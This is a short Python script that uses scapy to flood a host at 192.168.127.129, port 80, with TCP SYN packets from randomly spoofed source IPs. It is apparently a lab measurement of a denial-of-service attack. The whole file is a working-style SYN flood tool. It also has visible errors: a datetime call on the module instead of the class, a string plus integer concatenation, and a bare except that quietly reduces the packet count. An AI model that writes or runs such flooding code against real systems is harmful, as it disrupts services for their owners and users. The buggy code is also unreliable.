import datetime
from scapy.all import *
import random
import numpy as np

def randomIp():
	s=""+str(random.randint(1, 255))
	for i in range(0,3):
		s= s+"."+str(random.randint(0, 255))
	return s

iteration=500
numOfPacInEachIter=10000
count=1	
numbers=[]


dt_started = datetime.utcnow()
for x in range(iteration):
	for y in range(numOfPacInEachIter):	
		try:	
			send(IP(src=randomIp(),dst="192.168.127.129")/TCP(dport=80,flags="S"))
			dt_ended = datetime.utcnow()
			sumtime=(dt_ended - dt_started).total_seconds()
			numbers.append(sumtime)
			dt_started = datetime.utcnow()
			count=count+1
			print("already sent : "+ count )
		except:
			numOfPacInEachIter-=1
			dt_started = datetime.utcnow()
#with open("python-results.txt",'w+')as f:
#	f.write("syns:"+numbers+ "\n" + str(np.mean(numbers)) +"\n")
#f.close()
print("done!!!!!!!!!!!!!!!!!!!!!!")
